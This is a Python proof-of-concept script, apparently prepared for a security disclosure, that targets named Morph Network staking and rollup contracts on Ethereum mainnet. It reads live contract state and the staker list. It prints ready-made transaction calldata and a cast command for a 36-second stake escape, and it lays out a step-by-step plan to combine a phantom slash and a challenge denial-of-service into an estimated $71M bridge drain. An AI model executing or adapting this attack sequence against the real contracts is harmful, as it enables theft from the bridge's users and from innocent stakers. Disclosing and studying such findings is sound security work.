#!/usr/bin/env python3
"""
================================================================================
  Morph Network — Finding 2 Live Proof-of-Concept
  High (Critical when combined with Finding 1):
  withdrawalLockBlocks = 3 blocks (~36s) Eliminates Staker Economic Deterrence
  + Phantom Slash Drains Innocent Stakers' Pool
================================================================================

  Target   : Ethereum Mainnet
  Staking  : 0x0Dc417F8AF88388737c5053FF73f345f080543F7
  Rollup   : 0x759894Ced0e6af42c26668076Ffa84d02E3CeF60

  Two confirmed bugs:
    Bug A — withdrawalLockBlocks = 3 blocks (~36s):
      A whitelisted staker commits any batch then reclaims their full
      1 ETH stake in ~36 seconds, before any slash can reach them.
      Economic deterrence is effectively zero.

    Bug B — Phantom slash of address(0):
      After the escape, slash() resolves the escaped staker's bitmap
      slot to address(0) and still adds stakingValue (1 ETH) to valueSum.
      The resulting reward (0.3 ETH) is taken from INNOCENT stakers' pooled
      funds — not from the escaped attacker.

  Combined with Finding 1 (challengeDeposit = 1 wei DoS):
    Malicious staker commits fake-withdrawal-root batch → escapes in 36s
    → Finding 1 blocks challengers → batch finalized → bridge drained.

  Requirements:
    pip install requests
    python3 morph_finding2_poc.py

  NOTE: READ-ONLY. No transactions are sent. All data pulled live from mainnet.
================================================================================
"""

import sys
import time
import datetime
import requests

# ──────────────────────────────────────────────────────────────
# Config
# ──────────────────────────────────────────────────────────────
RPC      = "https://ethereum.publicnode.com"
ROLLUP   = "0x759894Ced0e6af42c26668076Ffa84d02E3CeF60"
STAKING  = "0x0Dc417F8AF88388737c5053FF73f345f080543F7"
ETH_PRICE_USD = 2500

# Pre-computed 4-byte selectors
SEL = {
    # L1Staking
    "withdrawalLockBlocks":   "0x41de239b",
    "stakingValue":           "0x4d64903a",
    "rewardPercentage":       "0x52d472eb",
    "challengeDeposit":       "0x0d13fd7b",
    "slashRemaining":         "0xab8c53dc",
    "stakerSet":              "0x303afb9e",   # (uint256)
    "stakerIndexes":          "0xdd4785f5",   # (address)
    "isActiveStaker":         "0x68015791",   # (address)
    "isStakerInDeleteList":   "0xdf155033",   # (address)
    "deleteableHeight":       "0x2e407a6f",   # (address)
    "withdrawals":            "0x7a9262a2",   # (address)
    "whitelist":              "0x9b19251a",   # (address)
    "getStakerBitmap":        "0xd096c3c6",   # (address)
    "withdraw":               "0x3ccfd60b",   # ()
    "claimWithdrawal":        "0xa3066aab",   # (address)
    # Rollup
    "proofWindow":            "0xa479265d",
    "finalizationPeriodSeconds": "0xce5db8d6",
    "lastCommittedBatchIndex":"0x121dcd50",
    "lastFinalizedBatchIndex":"0x059def61",
    "proofRewardPercent":     "0xfb1e8b04",
}

# ──────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────
def eth_call(to, data):
    r = requests.post(RPC, json={
        "jsonrpc": "2.0", "method": "eth_call",
        "params": [{"to": to, "data": data}, "latest"], "id": 1
    }, timeout=15)
    return r.json().get("result", "0x")

def call_int(to, sel_key, arg=None):
    data = SEL[sel_key]
    if arg is not None:
        if isinstance(arg, int):
            data += hex(arg)[2:].zfill(64)
        elif isinstance(arg, str) and arg.startswith("0x"):
            data += arg[2:].lower().zfill(64)
    raw = eth_call(to, data)
    return int(raw, 16) if raw and raw not in ("0x", "") else 0

def get_balance(addr):
    r = requests.post(RPC, json={
        "jsonrpc": "2.0", "method": "eth_getBalance",
        "params": [addr, "latest"], "id": 1
    }, timeout=15)
    return int(r.json().get("result", "0x0"), 16)

def encode_addr_calldata(selector_hex, addr):
    return selector_hex + addr[2:].lower().zfill(64)

# ──────────────────────────────────────────────────────────────
# Main PoC
# ──────────────────────────────────────────────────────────────
def main():
    print()
    print("=" * 72)
    print("  MORPH NETWORK — FINDING 2 LIVE PoC")
    print("  High/Critical: withdrawalLockBlocks=3 + Phantom Slash Bug")
    print("=" * 72)
    print(f"  Timestamp : {datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print(f"  RPC       : {RPC}")
    print()

    # ─────────────────────────────────────────────────────────
    # STEP 1 — Read all security parameters
    # ─────────────────────────────────────────────────────────
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 1 — On-chain parameter verification")
    print("──────────────────────────────────────────────────────────────────────")

    withdrawal_lock  = call_int(STAKING, "withdrawalLockBlocks")
    staking_value    = call_int(STAKING, "stakingValue")
    slash_reward_pct = call_int(STAKING, "rewardPercentage")
    challenge_dep    = call_int(STAKING, "challengeDeposit")
    slash_remaining  = call_int(STAKING, "slashRemaining")
    staking_balance  = get_balance(STAKING)

    proof_window     = call_int(ROLLUP, "proofWindow")
    fin_period       = call_int(ROLLUP, "finalizationPeriodSeconds")
    proof_reward_pct = call_int(ROLLUP, "proofRewardPercent")
    last_finalized   = call_int(ROLLUP, "lastFinalizedBatchIndex")
    last_committed   = call_int(ROLLUP, "lastCommittedBatchIndex")

    lock_seconds     = withdrawal_lock * 12
    staking_eth      = staking_value / 1e18
    staking_bal_eth  = staking_balance / 1e18

    print(f"  [L1Staking @ {STAKING}]")
    print(f"    withdrawalLockBlocks  = {withdrawal_lock} blocks  (~{lock_seconds}s)  ← VULNERABILITY")
    print(f"    stakingValue          = {staking_eth:.2f} ETH")
    print(f"    rewardPercentage      = {slash_reward_pct}%  (slash reward to challenger)")
    print(f"    challengeDeposit      = {challenge_dep} wei")
    print(f"    slashRemaining        = {slash_remaining} wei")
    print(f"    contract balance      = {staking_bal_eth:.2f} ETH")
    print()
    print(f"  [Rollup @ {ROLLUP}]")
    print(f"    finalizationPeriod    = {fin_period}s  ({fin_period/86400:.0f} days)")
    print(f"    proofWindow           = {proof_window}s  ({proof_window/86400:.0f} days)")
    print(f"    proofRewardPercent    = {proof_reward_pct}%")
    print(f"    lastFinalizedBatch    = {last_finalized}")
    print(f"    lastCommittedBatch    = {last_committed}")

    # ─────────────────────────────────────────────────────────
    # STEP 2 — Read live staker set
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 2 — Live staker set (attack candidates)")
    print("──────────────────────────────────────────────────────────────────────")

    active_stakers = []
    zero_addr = "0x" + "0" * 40
    for i in range(255):
        raw = eth_call(STAKING, SEL["stakerSet"] + hex(i)[2:].zfill(64))
        if not raw or raw == "0x" or len(raw) < 66:
            if i > 10:
                break
            continue
        addr = "0x" + raw[-40:]
        if addr.lower() == zero_addr:
            if i > 10:
                break
            continue
        idx    = call_int(STAKING, "stakerIndexes",    addr)
        active = call_int(STAKING, "isActiveStaker",   addr)
        dh     = call_int(STAKING, "deleteableHeight", addr)
        wd     = call_int(STAKING, "withdrawals",      addr)
        bitmap = call_int(STAKING, "getStakerBitmap",  addr)
        wl     = call_int(STAKING, "whitelist",        addr)
        active_stakers.append({
            "slot": i, "addr": addr, "index": idx,
            "active": bool(active), "deleteableHeight": dh,
            "withdrawals": wd, "bitmap": bitmap, "whitelisted": bool(wl)
        })

    print(f"  {'Slot':>4}  {'Address':>42}  {'Idx':>3}  {'Active':>6}  {'Bitmap':>8}")
    print(f"  {'─'*4}  {'─'*42}  {'─'*3}  {'─'*6}  {'─'*8}")
    for s in active_stakers:
        print(f"  {s['slot']:>4}  {s['addr']:>42}  {s['index']:>3}  "
              f"{'Yes' if s['active'] else 'No':>6}  {s['bitmap']:>8}")

    if not active_stakers:
        print("  No active stakers found in first 255 slots.")
        target_staker = None
    else:
        target_staker = active_stakers[0]
        print(f"\n  PoC will use staker[{target_staker['slot']}] = {target_staker['addr']}")

    # ─────────────────────────────────────────────────────────
    # STEP 3 — Assert Bug A: 36-second escape window
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 3 — Bug A: 36-second stake escape (withdrawalLockBlocks = 3)")
    print("──────────────────────────────────────────────────────────────────────")

    print(f"  withdrawalLockBlocks = {withdrawal_lock} blocks")
    print(f"  Ethereum block time  ≈ 12 seconds")
    print(f"  Lock duration        = {withdrawal_lock} × 12 = {lock_seconds} seconds")
    print()
    print(f"  Compare to finalizationPeriod = {fin_period}s ({fin_period/86400:.0f} days)")
    print(f"  Escape window is {fin_period / lock_seconds:.0f}× shorter than the challenge window")
    print()
    print(f"  Attack timeline:")
    print(f"    T+0s   : commitBatch(batchDataInput={{fakeWithdrawalRoot, ...}})")
    print(f"    T+1s   : withdraw()")
    print(f"               _removeStaker(): deleteableHeight = currentBlock + {withdrawal_lock}")
    print(f"               isActiveStaker() → FALSE immediately")
    print(f"    T+{lock_seconds}s  : claimWithdrawal(attackerAddress)")
    print(f"               _cleanStakerStore() clears: stakerSet[slot], stakerIndexes, deleteableHeight")
    print(f"               _transfer(attacker, {staking_eth:.1f} ETH)  ← full stake returned")
    print(f"    T+{lock_seconds}s+ : attacker has 0 stake at risk")
    print(f"    T+{fin_period}s : challenge window expires (no penalty for attacker)")
    print()

    if lock_seconds <= 60:
        print(f"  [PASS] ✓ withdrawalLockBlocks = {withdrawal_lock} ({lock_seconds}s) — escape in under 1 minute")

    # ─────────────────────────────────────────────────────────
    # STEP 4 — Generate Bug A calldata
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 4 — Bug A calldata: withdraw() + claimWithdrawal()")
    print("──────────────────────────────────────────────────────────────────────")

    receiver = target_staker["addr"] if target_staker else "0x<attacker_address>"

    withdraw_calldata = SEL["withdraw"]
    claim_receiver    = receiver if target_staker else "0x" + "aa" * 20
    claim_calldata    = SEL["claimWithdrawal"] + claim_receiver[2:].lower().zfill(64)

    print(f"  TX 1 — withdraw()  [sent immediately after commitBatch]")
    print(f"    to:    {STAKING}")
    print(f"    data:  {withdraw_calldata}")
    print(f"    value: 0")
    print()
    print(f"  TX 2 — claimWithdrawal(receiver)  [sent after {lock_seconds}s, ~{withdrawal_lock} blocks]")
    print(f"    to:    {STAKING}")
    print(f"    data:  {claim_calldata}")
    print(f"    arg:   receiver = {claim_receiver}")
    print(f"    value: 0")
    print()
    print(f"  cast call (simulate TX 2 after {lock_seconds}s):")
    print(f"    cast call \\")
    print(f"      --rpc-url {RPC} \\")
    print(f"      {STAKING} \\")
    print(f"      'claimWithdrawal(address)' \\")
    print(f"      {claim_receiver}")

    # ─────────────────────────────────────────────────────────
    # STEP 5 — Assert Bug B: Phantom slash
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 5 — Bug B: Phantom slash of address(0) drains innocent stakers")
    print("──────────────────────────────────────────────────────────────────────")

    phantom_value_eth  = staking_eth
    phantom_reward_eth = phantom_value_eth * slash_reward_pct / 100
    phantom_remain_eth = phantom_value_eth - phantom_reward_eth

    print("  After claimWithdrawal() the escaped staker's slot in stakerSet[]")
    print("  becomes address(0). Code path in slash(bitmap):")
    print()
    print("  getStakersFromBitmap(escaped_bitmap)")
    print("    → reads stakerSet[slot] = address(0)  (deleted by _cleanStakerStore)")
    print("    → returns [address(0)]")
    print()
    print("  for addr in [address(0)]:")
    print("    withdrawals[address(0)]       = 0  → branch 1: SKIP")
    print("    isStakerInDeleteList(address(0))")
    print("      deleteableHeight[address(0)] = 0  → returns FALSE")
    print("      !FALSE = TRUE                     → branch 2: ENTER")
    print(f"    valueSum += stakingValue           += {phantom_value_eth:.1f} ETH (PHANTOM)")
    print("    _removeStaker(address(0))          → adds 0x0 to deleteList (harmless)")
    print("    delete whitelist[address(0)]       → harmless")
    print("    removedList[address(0)] = true     → harmless")
    print()
    print(f"  reward = {phantom_value_eth:.1f} × {slash_reward_pct}% = {phantom_reward_eth:.2f} ETH")
    print(f"  slashRemaining += {phantom_remain_eth:.2f} ETH")
    print(f"  _transfer(rollupContract, {phantom_reward_eth:.2f} ETH)")
    print()
    print(f"  L1Staking balance NOW = {staking_bal_eth:.2f} ETH")
    if staking_bal_eth - staking_eth >= phantom_reward_eth:
        print(f"  After escape:          {staking_bal_eth - staking_eth:.2f} ETH")
        print(f"  Transfer {phantom_reward_eth:.2f} ETH → SUCCEEDS using innocent stakers' funds")
        print(f"  [PASS] ✓ Phantom slash executes without revert")
    else:
        print(f"  Transfer {phantom_reward_eth:.2f} ETH → would REVERT (insufficient balance)")
    print()
    print(f"  NET RESULT:")
    print(f"    Escaped staker  : +{staking_eth:.1f} ETH  (stake returned, zero penalty)")
    print(f"    Innocent stakers: -{phantom_reward_eth:.2f} ETH  (taken to fund phantom reward)")
    print(f"    rollupContract  : +{phantom_reward_eth:.2f} ETH  (reward from wrong source)")

    # ─────────────────────────────────────────────────────────
    # STEP 6 — Verify staking pool can cover phantom slash
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 6 — Staking pool depletion analysis")
    print("──────────────────────────────────────────────────────────────────────")

    active_count = len(active_stakers)
    pool_after_escape = staking_bal_eth - staking_eth
    phantom_slashes_possible = int(pool_after_escape / phantom_reward_eth) if phantom_reward_eth > 0 else 0

    print(f"  Active stakers:           {active_count}")
    print(f"  L1Staking balance:        {staking_bal_eth:.2f} ETH")
    print(f"  After 1 escape:           {pool_after_escape:.2f} ETH remaining")
    print(f"  Cost per phantom slash:   {phantom_reward_eth:.2f} ETH (from innocent stakers)")
    print(f"  Max phantom slashes:      {phantom_slashes_possible}")
    print()
    print(f"  If all {active_count} stakers escape and are phantom-slashed:")
    total_escape = active_count * staking_eth
    total_phantom = active_count * phantom_reward_eth
    print(f"    Total ETH returned to escaped stakers: {total_escape:.2f} ETH")
    print(f"    Total phantom drain on pool:           {total_phantom:.2f} ETH")
    print(f"    Remaining in contract:                 {staking_bal_eth - total_escape - total_phantom:.2f} ETH")

    # ─────────────────────────────────────────────────────────
    # STEP 7 — Combined attack with Finding 1
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 7 — Combined attack: Finding 2 + Finding 1 = Critical bridge drain")
    print("──────────────────────────────────────────────────────────────────────")

    print(f"  Prerequisites:")
    print(f"    • Whitelisted staker (to commitBatch)")
    print(f"    • Whitelisted challenger (for Finding 1 DoS)  — can be same entity")
    print()
    print(f"  Attack sequence:")
    print(f"    T+0s   : commitBatch(fakeWithdrawalRoot)              [staker]")
    print(f"    T+1s   : withdraw()                                    [staker]")
    print(f"    T+{lock_seconds}s  : claimWithdrawal() → recover {staking_eth:.1f} ETH         [staker]")
    print(f"    T+{lock_seconds}s+ : challengeState(anyBatch, 1 wei)             [challenger]")
    print(f"               → ALL {last_committed - last_finalized} pending batches extended +3 days")
    print(f"               → Challengers cannot challenge fake batch")
    print(f"    T+{fin_period}s : Fake batch's challenge window expired")
    print(f"    T+{fin_period+1}s : finalizeBatch(fakeBatch) called by attacker")
    print(f"               → withdrawalRoots[fakeRoot] = true")
    print(f"    T+{fin_period+2}s : proveAndRelayMessage(fakeWithdrawal, proof, fakeRoot)")
    print(f"               → L1ETHGateway.finalizeWithdrawETH(attacker, TVL)")
    print(f"               → Bridge drained: ~$71,000,000")
    print()
    print(f"  Total attacker cost:")
    print(f"    Staking bond:       {staking_eth:.1f} ETH recovered in {lock_seconds}s — net $0")
    dos_annual = 121 * 5.00
    print(f"    DoS gas (1 year):   ~${dos_annual:.0f}")
    print(f"    Net profit:         ~$71,000,000 − ~${dos_annual:.0f} ≈ $71,000,000")

    # ─────────────────────────────────────────────────────────
    # Summary
    # ─────────────────────────────────────────────────────────
    print()
    print("=" * 72)
    print("  SUMMARY")
    print("=" * 72)
    print(f"  withdrawalLockBlocks (live) = {withdrawal_lock} blocks (~{lock_seconds}s)  ← key parameter")
    print(f"  stakingValue (live)         = {staking_eth:.1f} ETH")
    print(f"  rewardPercentage (live)     = {slash_reward_pct}%")
    print(f"  Active stakers              = {active_count}")
    print(f"  L1Staking balance           = {staking_bal_eth:.2f} ETH")
    print()
    print(f"  Bug A: Staker escapes with full {staking_eth:.1f} ETH in {lock_seconds}s")
    print(f"         → Zero economic deterrence for malicious batch commits")
    print(f"  Bug B: Phantom slash sends {phantom_reward_eth:.2f} ETH from innocent stakers to rollup")
    print(f"         → Accounting error: escaped staker's slot → address(0)")
    print()
    print(f"  STANDALONE SEVERITY : HIGH")
    print(f"  + FINDING 1 COMBINED: CRITICAL (~$71M bridge drain)")
    print("=" * 72)
    print()

if __name__ == "__main__":
    main()
